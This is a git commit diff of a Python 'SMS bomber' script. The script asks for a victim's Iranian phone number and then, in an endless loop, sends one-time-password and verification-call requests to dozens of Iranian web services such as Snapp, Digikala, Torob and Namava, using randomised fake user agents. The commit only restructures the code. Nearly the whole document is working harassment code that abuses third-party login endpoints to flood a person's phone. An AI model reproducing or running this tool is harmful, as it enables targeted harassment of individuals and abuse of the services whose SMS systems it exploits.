8483d2028bc4e75352a5a3734f059a14828c59e1
meower1 <109747197+meower1@users.noreply.github.com>
2023-04-21 15:38:26 +0330

    fixed errors breaking the loop but the code looks terrible

--- sms-bomber3.py
+++ sms-bomber3.py
@@ -4,6 +4,7 @@ import random
 import string
 from fake_useragent import UserAgent #pip install fake-useragent
 
+#shits not working ddhkdcqujhvLqvaluydvla f
 while True:
     number = input("Enter the victim's number(9xxxxxxxxx) ~> ")
     if not number.isdigit() or len(number) != 10 or number[0] != '9':
@@ -11,7 +12,6 @@ while True:
         continue
 
     break
-
 
 ua = UserAgent()
 chars = string.ascii_letters + string.digits
@@ -24,76 +24,53 @@ for i in range(6):
     persian_string += persian_chars[random_index]
 
 
-def basalam():
+def smsbomb():
     try:
-        # Basalam
-        basalam_url = 'https://auth.basalam.com/otp-request'
-        basalam_payload = {'mobile': '0'+number}
-        basalam_req = requests.post(basalam_url, data=basalam_payload, json=rhead,timeout=5)
-        print('Basalam: ' + str(basalam_req.status_code)) 
-    except:
-        pass
-def snap():
-        try:
-            # Snapp
-            snapp_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
-            snapp_payload = {'cellphone': '+98'+number}
-            snapp_req = requests.post(snapp_url, data=snapp_payload, json=rhead,timeout=5)
-            print('Snapp: ' + str(snapp_req.status_code))
-        except:
-            pass
-def lendo():
-    try:
-         # Lendo
+        ### SMS APIs ###
+        
+        rhead = {
+            'User-Agent': ua.random,
+            'Accept': '*/*'
+        }
+        # Snapp
+        snapp_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
+        snapp_payload = {'cellphone': '+98'+number}
+        snapp_req = requests.post(snapp_url, data=snapp_payload, json=rhead,timeout=5)
+        print('Snapp: ' + str(snapp_req.status_code))
+
+        # Lendo
         lendo_url = 'https://api.lendo.ir/api/customer/auth/send-otp'
         lendo_payload = {'mobile': '0'+number}
         lendo_req = requests.post(lendo_url, data=lendo_payload, json=rhead,timeout=5)
-        print('Lendo: ' + str(lendo_req.status_code))   
-    except:
-         pass
-    
-def baskool():
-    try:
+        print('Lendo: ' + str(lendo_req.status_code))
+
         # Buskool
         buskool_url = 'https://www.buskool.com/send_verification_code'
         buskool_payload = {'phone': '0'+number}
         buskool_req = requests.post(buskool_url, data=buskool_payload, json=rhead,timeout=5)
         print('Buskool: ' + str(buskool_req.status_code))
-    except:
-         pass
-    
-def torob():
-    try:
+
         # Torob
         torob_url = 'https://api.torob.com/v4/user/phone/send-pin'
         torob_params = {'phone_number': '0'+number}
         torob_req = requests.get(torob_url, params=torob_params, json=rhead,timeout=5)
         print('Torob: ' + str(torob_req.status_code))
-    except:
-        pass
-def drdr():
-    try:
+
+        # DrDr
         drdr_url = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
         drdr_payload = {
             'phoneNumber': number,
             'userType': 'PATIENT'
         }
         drdr_req = requests.post(drdr_url, data=drdr_payload, json=rhead,timeout=5)
-        print('DrDr: ' + str(drdr_req.status_code))     
-    except:
-        pass
-def itol():
-    try:
+        print('DrDr: ' + str(drdr_req.status_code))
+
         # Itoll
         itoll_url = 'https://app.itoll.ir/api/v1/auth/login'
         itoll_payload = {'mobile': '0'+number}
         itoll_req = requests.post(itoll_url, data=itoll_payload, json=rhead,timeout=5)
-        print('Itoll: ' + str(itoll_req.status_code))       
-    except:
-        pass
+        print('Itoll: ' + str(itoll_req.status_code))
 
-def telewebion():
-    try:
         # Telewebion
         telewebion_url = 'https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one'
         telewebion_payload = {
@@ -102,13 +79,8 @@ def telewebion():
             'smsStatus': 'default'
         }
         telewebion_req = requests.post(telewebion_url, data=telewebion_payload, json=rhead,timeout=5)
-        print('Telewebion: ' + str(telewebion_req.status_code))       
-    except:
-        pass
-
-
-def arastag():
-    try:
+        print('Telewebion: ' + str(telewebion_req.status_code))
+        
         # ArasTag
         arastag_url = 'https://arastag.ir/wp-admin/admin-ajax.php'
         arastag_payload = {
@@ -118,11 +90,13 @@ def arastag():
         }
         arastag_req = requests.post(arastag_url, data=arastag_payload, json=rhead,timeout=5)
         print('ArasTag: ' + str(arastag_req.status_code))
-    except:
-        pass
 
-def zzzagros():
-    try:
+        # Basalam
+        basalam_url = 'https://auth.basalam.com/otp-request'
+        basalam_payload = {'mobile': '0'+number}
+        basalam_req = requests.post(basalam_url, data=basalam_payload, json=rhead,timeout=5)
+        print('Basalam: ' + str(basalam_req.status_code))
+
         # ZzZagros
         zzzagros_url = 'https://www.zzzagros.com/wp-admin/admin-ajax.php'
         zzzagros_payload = {
@@ -134,11 +108,7 @@ def zzzagros():
         }
         zzzagros_req = requests.post(zzzagros_url, data=zzzagros_payload, json=rhead,timeout=5)
         print('ZzZagros: ' + str(zzzagros_req.status_code))
-    except:
-        pass
 
-def novinmedical():
-    try:
         # NovinMedical
         novinmedical_url = 'https://novinmedical.com/wp-admin/admin-ajax.php'
         novinmedical_payload = {
@@ -148,11 +118,7 @@ def novinmedical():
         }
         novinmedical_req = requests.post(novinmedical_url, data=novinmedical_payload, json=rhead,timeout=5)
         print('NovinMedical: ' + str(novinmedical_req.status_code))
-    except:
-        pass
 
-def harikashop():
-    try:
         # HarikaShop
         harikashop_url = 'https://harikashop.com/login?back=my-account'
         harikashop_payload = {
@@ -170,11 +136,7 @@ def harikashop():
         }
         harikashop_req = requests.post(harikashop_url, data=harikashop_payload, json=rhead,timeout=5)
         print('HarikaShop: ' + str(harikashop_req.status_code))
-    except:
-        pass
 
-def hamrahsport():
-    try:
         # HamrahSport
         hamrahsport_url = 'https://hamrahsport.com/send-otp'
         hamrahsport_payload = {
@@ -186,51 +148,31 @@ def hamrahsport():
         }
         hamrahsport_req = requests.post(hamrahsport_url, data=hamrahsport_payload, json=rhead,timeout=5)
         print('HamrahSport: ' + str(hamrahsport_req.status_code))
-    except:
-        pass
 
-def caropex():
-    try:
         # Caropex
         caropex_url = 'https://caropex.com/api/v1/user/login'
         caropex_payload = {'mobile': '0'+number}
         caropex_req = requests.post(caropex_url, data=caropex_payload, json=rhead,timeout=5)
         print('Caropex: ' + str(caropex_req.status_code))
-    except:
-        pass
 
-def tamimpishro():
-    try:
         # TamimPishro
         tamimpishro_url = 'https://www.tamimpishro.com/site/api/v1/user/otp'
         tamimpishro_payload = {'mobile': '0'+number}
         tamimpishro_req = requests.post(tamimpishro_url, data=tamimpishro_payload, json=rhead,timeout=5)
         print('TamimPishro: ' + str(tamimpishro_req.status_code))
-    except:
-        pass
 
-def gap():
-    try:
         # Gap
         gap_url = 'https://core.gap.im/v1/user/add.json'
         gap_params = {'mobile': '+98'+number}
         gap_req = requests.get(gap_url, params=gap_params, json=rhead,timeout=5)
         print('Gap: ' + str(gap_req.status_code))
-    except:
-        pass
 
-def shahrefafa():
-    try:
         # ShahreFafa
         fafait_url = 'https://api2.fafait.net/oauth/check-user'
         fafait_payload = {'id': '0'+number}
         fafait_req = requests.post(fafait_url, data=fafait_payload, json=rhead,timeout=5)
         print('ShahreFafa: ' + str(fafait_req.status_code))
-    except:
-        pass
 
-def fankala():
-    try:
         # FanKala
         fankala_url = 'https://fankala.com/wp-admin/admin-ajax.php'
         fankala_payload = {
@@ -240,11 +182,7 @@ def fankala():
         }
         fankala_req = requests.post(fankala_url, data=fankala_payload, json=rhead,timeout=5)
         print('FanKala: ' + str(fankala_req.status_code))
-    except:
-        pass
 
-def khanoumi():
-    try:
         # Khanoumi
         khanoumi_url = 'https://www.khanoumi.com/accounts/sendotp'
         khanoumi_payload = {
@@ -253,51 +191,31 @@ def khanoumi():
         }
         khanoumi_req = requests.post(khanoumi_url, data=khanoumi_payload, json=rhead,timeout=5)
         print('Khanoumi: ' + str(khanoumi_req.status_code))
-    except:
-        pass
 
-def digistyle():
-    try:
         # DigiStyle
         digistyle_url = 'https://www.digistyle.com/users/login-register/'
         digistyle_payload = {'loginRegister[email_phone]': '0'+number}
         digistyle_req = requests.post(digistyle_url, data=digistyle_payload, json=rhead,timeout=5)
         print('DigiStyle: ' + str(digistyle_req.status_code))
-    except:
-        pass
 
-def banimode():
-    try:
         # BaniMode
         banimode_url = 'https://mobapi.banimode.com/api/v2/auth/request'
         banimode_payload = {'phone': '0'+number}
         banimode_req = requests.post(banimode_url, data=banimode_payload, json=rhead,timeout=5)
         print('BaniMode: ' + str(banimode_req.status_code))
-    except:
-        pass
 
-def timcheh():
-    try:
         # Timcheh
         timcheh_url = 'https://api.timcheh.com/auth/otp/send'
         timcheh_payload = {'mobile': '0'+number}
         timcheh_req = requests.post(timcheh_url, data=timcheh_payload, json=rhead,timeout=5)
         print('Timcheh: ' + str(timcheh_req.status_code))
-    except:
-        pass
 
-def achareh():
-    try:
         # Achareh
         achareh_url = 'https://api.achareh.co/v2/accounts/login/'
         achareh_payload = {'phone': '98'+number}
         achareh_req = requests.post(achareh_url, data=achareh_payload, json=rhead,timeout=5)
         print('Achareh: ' + str(achareh_req.status_code))
-    except:
-        pass
 
-def mrbilit():
-    try:
         # MrBilit
         mrbilit_url = 'https://auth.mrbilit.com/api/login/exists/v2'
         mrbilit_params = {
@@ -307,12 +225,8 @@ def mrbilit():
         }
         mrbilit_req = requests.get(mrbilit_url, params=mrbilit_params, json=rhead,timeout=5)
         print('MrBilit: ' + str(mrbilit_req.status_code))
-    except:
-        pass
 
-def rojashop():
-    try:
-       # RojaShop
+        # RojaShop
         rojashop_url = 'https://rojashop.com/api/loginRegister'
         rojashop_payload = {
             'mobile': number,
@@ -320,21 +234,14 @@ def rojashop():
         }
         rojashop_req = requests.post(rojashop_url, data=rojashop_payload, json=rhead,timeout=5)
         print('RojaShop: ' + str(rojashop_req.status_code))
-    except:
-        pass
 
-def safirstores():
-    try:
         # SafirStores
         safirstores_url = 'https://www.safirstores.com/index.php?route=account%2Flogin%2FgetRandCode'
         safirstores_payload = {'telephone': '0'+number}
         safirstores_req = requests.post(safirstores_url, data=safirstores_payload, json=rhead,timeout=5)
         print('SafirStores: ' + str(safirstores_req.status_code))
-    except:
-        pass
 
-def digikala():
-    try:
+        # Digikala
         digikala_url = 'https://api.digikala.com/v1/user/authenticate/'
         digikala_payload = {
             'backUrl': '/',
@@ -343,21 +250,13 @@ def digikala():
         }
         digikala_req = requests.post(digikala_url, json=digikala_payload, headers=rhead,timeout=5)
         print('Digikala: '+str(digikala_req.status_code))
-    except:
-        pass
 
-def mobit():
-    try:
         # Mobit
         mobit_url = 'https://api.mobit.ir/api/web/v8/register/register'
         mobit_payload = {'number': '0'+number}
         mobit_req = requests.post(mobit_url, json=mobit_payload, headers=rhead,timeout=5)
         print('Mobit: '+str(mobit_req.status_code))
-    except:
-        pass
 
-def okala():
-    try:
         # Okala
         okala_url = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
         okala_payload = {
@@ -368,11 +267,7 @@ def okala():
         }
         okala_req = requests.post(okala_url, json=okala_payload, headers=rhead,timeout=5)
         print('Okala: '+str(okala_req.status_code))
-    except:
-        pass
 
-def doctoreto():
-    try:
         # Doctoreto
         doctoreto_url = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
         doctoreto_payload = {
@@ -381,50 +276,30 @@ def doctoreto():
         }
         doctoreto_req = requests.post(doctoreto_url, json=doctoreto_payload, headers=rhead,timeout=5)
         print('Doctoreto: '+str(doctoreto_req.status_code))
-    except:
-        pass
 
-def snappdoctor():
-    try:
         # SnappDoctor
         snappdoctor_url = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{number}/sms'
         snappdoctor_params = {'cCode': '+98'}
         snappdoctor_req = requests.get(snappdoctor_url, params=snappdoctor_params, json=rhead,timeout=5)
         print('SnappDoctor: ' + str(snappdoctor_req.status_code))
-    except:
-        pass
 
-def snappapps():
-    try:
         # SnappApps
         snappapps_url = 'https://api.snapp.ir/api/v1/sms/link'
         snappapps_payload = {'phone':'0'+number}
         snappapps_req = requests.post(snappapps_url, json=snappapps_payload, headers=rhead,timeout=5)
         print('SnappApps: '+str(snappapps_req.status_code))
-    except:
-        pass
 
-def namava():
-    try:
         # Namava
         namava_url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
         namava_payload = {'UserName':'+98'+number}
         namava_req = requests.post(namava_url, json=namava_payload, headers=rhead,timeout=5)
         print('Namava: '+str(namava_req.status_code))
-    except:
-        pass
 
-def filmnet():
-    try:
         # FilmNet
         filmnet_url = f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp'
         filmnet_req = requests.get(filmnet_url, json=rhead,timeout=5)
         print('FilmNet: ' + str(filmnet_req.status_code))
-    except:
-        pass
 
-def dalfak():
-    try:
         # Dalfak
         dalfak_url = 'https://www.dalfak.com/api/auth/sendVerificationCode'
         dalfak_payload = {
@@ -433,11 +308,9 @@ def dalfak():
         }
         dalfak_req = requests.post(dalfak_url, json=dalfak_payload, headers=rhead,timeout=5)
         print('dalfak: '+str(dalfak_req.status_code))
-    except:
-        pass
 
-def digicall():
-    try:
+        ### Call APIs ###
+
         # DigikalaCall
         digikalacall_url = 'https://api.digikala.com/v1/user/authenticate/'
         digikalacall_payload = {
@@ -447,54 +320,23 @@ def digicall():
         }
         digikalacall_req = requests.post(digikalacall_url, json=digikalacall_payload, headers=rhead,timeout=5)
         print('DigikalaCall: '+str(digikalacall_req.status_code))
+
+    except requests.exceptions.SSLError:
+        print("an SSL error occurred. continuing...")
+        pass
+    except requests.exceptions.ConnectTimeout:
+        print("connection timeout. continuing...")
+        pass
+    except requests.exceptions.Timeout or requests.exceptions.ReadTimeout:
+        print("read timeout. continuing...")
+        pass
+    except KeyboardInterrupt:
+        print("see you later o/")
     except:
+        print("an unexcpected error occured. continuing...")
         pass
 
-
 while True:
-    
-        rhead = {
-            'User-Agent': ua.random,
-            'Accept': '*/*'
-        }
 
-        snap()
-        lendo()
-        baskool()
-        torob()
-        drdr()
-        itol()
-        telewebion()
-        arastag()
-        basalam()
-        zzzagros()
-        novinmedical()
-        harikashop()
-        hamrahsport()
-        caropex()
-        tamimpishro()
-        gap()
-        shahrefafa()
-        fankala()
-        khanoumi()
-        digistyle()
-        banimode()
-        timcheh()
-        achareh()
-        mrbilit()
-        rojashop()
-        safirstores()
-        digikala()
-        mobit()
-        okala()
-        doctoreto()
-        snappdoctor()
-        snappapps()
-        namava()
-        filmnet()
-        dalfak()
-        dalfak()
-        digicall()
-        
-
-        sleep(2)        
+        smsbomb()
+        sleep(2)
